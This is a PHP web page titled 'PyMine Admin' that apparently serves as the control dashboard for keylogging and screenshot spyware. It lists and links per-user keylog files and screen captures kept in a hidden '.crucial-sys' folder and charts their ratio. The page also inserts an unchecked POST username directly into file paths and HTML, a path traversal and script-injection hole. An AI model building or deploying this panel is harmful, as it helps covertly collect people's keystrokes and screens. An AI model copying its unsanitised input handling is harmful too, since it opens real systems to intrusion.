<?php
    $uname = $_POST["uname"];
?>

<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
    <link rel="icon" type="image/png" href="assets/img/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Light Bootstrap Dashboard - Free Bootstrap 4 Admin Dashboard by Creative Tim</title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
    <!--     Fonts and icons     -->
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,200" rel="stylesheet" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" />
    <!-- CSS Files -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" />
    <link href="assets/css/light-bootstrap-dashboard.css?v=2.0.0 " rel="stylesheet" />
    <!-- CSS Just for demo purpose, don't include it in your project -->
    <link href="assets/css/demo.css" rel="stylesheet" />
    <?php
        $scFileDir = "/usr/share/fileupload/home/$uname/.crucial-sys/screenshots";
        $filecount = 0;
        $files = scandir($scFileDir);
        $filecount = count($files);

        $txtFileDir = "/usr/share/fileupload/home/$uname/.crucial-sys/keylogs";
        $filecount2 = 0;
        $files2 = scandir($txtFileDir);
        $filecount2 = count($files2)-2;

        $sumFileCount = $filecount + $filecount2;
        $percentFileCount1 = ($filecount / $sumFileCount) * 100;
        $percentFileCount2 = ($filecount2 / $sumFileCount) * 100;

        $dataPoints = array(
            array("label"=>"Keylog Files", "y"=>$percentFileCount2),
            array("label"=>"Screenshots", "y"=>$percentFileCount1),
        )
    ?>
    <script>
        window.onload = function() {


        var chart = new CanvasJS.Chart("chartContainer", {
    	animationEnabled: true,
    	title: {
	    	text: ""
    	},
    	subtitles: [{
    		text: ""
    	}],
	    data: [{
	    	type: "pie",
	    	yValueFormatString: "#,##0.00\"%\"",
	    	indexLabel: "{label} ({y})",
	    	dataPoints: <?php echo json_encode($dataPoints, JSON_NUMERIC_CHECK); ?>
	    }]
    });
    chart.render();

    }
    </script>

</head>


<body>
 <div class="wrapper">
        <div class="sidebar" data-color="red">
            <!--
        Tip 1: You can change the color of the sidebar using: data-color="purple | blue | green | orange | red"

        Tip 2: you can also add an image using data-image tag
    -->
            <div class="sidebar-wrapper">
                <div class="logo">
                    <a href="https://youtu.be/oHg5SJYRHA0" class="simple-text">
                        PyMine Admin
                    </a>
                </div>
                <ul class="nav">
                    <li class="nav-item active">
                        <a class="nav-link" href="dashboard.php">
                            <i class="nc-icon nc-chart-pie-35"></i>
                            <p>Dashboard</p>
                        </a>
                    </li>
                    <li>
                        <a class="nav-link" href="./citations.html">
                            <i class="nc-icon nc-paper-2"></i>
                            <p>Citations</p>
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="main-panel">
            <!-- Navbar -->
            <nav class="navbar navbar-expand-lg " color-on-scroll="500">
                <div class="container-fluid">
                    <a class="navbar-brand" href="#pablo">User Files</a>
                    <button href="" class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-bar burger-lines"></span>
                        <span class="navbar-toggler-bar burger-lines"></span>
                        <span class="navbar-toggler-bar burger-lines"></span>
                    </button>
                    <div class="collapse navbar-collapse justify-content-end" id="navigation">
                        <ul class="navbar-nav ml-auto">
                            <li class="nav-item">
                                <a class="nav-link" href="#pablo">
                                    <span class="no-icon">Log out</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>
            <!-- End Navbar -->
<div class="content" style="background-color:#DCDCDC">
                <div class="container-fluid" style="background-color:#DCDCDC">
                <div class="row">
                <div class="col-md-12">
                            <div class="card">
                                <div class="card-header">
                                    <h4 class="card-title">File Ratio</h4>
                                    <p class="card-category">PyMine</p>
                                </div>
                                <div class="card-body">
                                    <div id="chartContainer" style="height: 370px;"></div>
                                </div>
                            </div>
                        </div>

                </div>
                <br>
<div class="row">
    <div class="col-md-6">
        <div class="card  card-tasks">
            <div class="card-header ">
                <h4 class="card-title">Screenshots</h4>
            </div>
            <div class="card-body ">
                <?php
                    echo "Here are the files for our screenshots<br><br>";
                    $path = "/usr/share/fileupload/home/$uname/.crucial-sys/screenshots";
                    $dh = opendir($path);
                    $i=1;
                    while (($file = readdir($dh)) !== false) {
                        if($file != "." && $file != ".." && $file != "sample.php" && $file != ".htaccess" && $file != "error_log" && $file != "cgi-bin") {
                        echo "<a href='/userdata/home/" . $uname . "/.crucial-sys/screenshots/$file'>$file</a><br /><br />";
                        $i++;
                            }
                    }
                    closedir($dh);
                ?>
            </div>
            <div class="card-footer ">
                <hr>
                <div class="stats">
                    <i class="fa fa-check"></i> Data has been update!
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-6">
        <div class="card  card-tasks">
            <div class="card-header ">
                <h4 class="card-title">Keylog Files</h4>
            </div>
            <div class="card-body ">
                <?php
                    echo "Here are the files for our keylog files<br><br>";
                    $path = "/usr/share/fileupload/home/$uname/.crucial-sys/keylogs";
                    $dh = opendir($path);
                    $i=1;
                    while (($file = readdir($dh)) !== false) {
                        if($file != "." && $file != ".." && $file != "sample.php" && $file != ".htaccess" && $file != "error_log" && $file != "cgi-bin") {
                        echo "<a href='/userdata/home/" . $uname . "/.crucial-sys/keylogs/$file'>$file</a><br /><br />";
                        $i++;
                            }
                    }
                    closedir($dh);
                ?>
            </div>
            <div class="card-footer ">
                <hr>
                <div class="stats">
                    <i class="fa fa-check"></i> Data has been update!
                </div>
            </div>
        </div>
       </div>
      </div>
    </div>
</div>
<footer class="footer">
                <div class="container-fluid">
                    <nav>
                        <p class="copyright text-center">
                            ©
                            <script>
                                document.write(new Date().getFullYear())

                            </script>
                            <a href="">PyMine</a>, The Future is here! <3 </p> </nav> </div> </footer>
</div>
</div>
<script src="https://canvasjs.com/assets/script/canvasjs.min.js"></script>
</body>
